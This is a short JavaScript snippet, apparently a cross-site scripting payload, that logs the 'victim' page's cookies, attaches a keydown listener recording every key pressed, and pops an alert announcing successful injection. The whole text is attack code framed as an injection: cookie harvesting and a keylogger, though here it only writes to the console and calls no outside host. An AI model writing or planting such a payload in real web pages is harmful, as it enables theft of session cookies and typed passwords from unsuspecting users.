console.log("Victim cookie:", document.cookie);

document.addEventListener("keydown", e => {
  console.log("Key pressed:", e.key);
});

alert("Injected successfully 🧠");
